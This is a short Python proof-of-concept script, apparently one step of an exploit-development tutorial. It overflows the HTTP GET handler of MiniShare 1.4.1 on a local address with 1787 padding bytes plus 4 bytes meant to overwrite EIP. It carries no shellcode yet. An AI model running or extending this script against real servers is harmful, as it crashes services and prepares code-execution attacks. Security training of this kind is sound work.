#!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 4 of proof of concept by Vry4n
# This script is intended the specific stack crash 1787 bytes (A) and 4 more bytes (B) characters to overwrite the EIP
import socket

# buffer 1787
FUZZ = "A" * 1787
EIP = "B" * 4

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
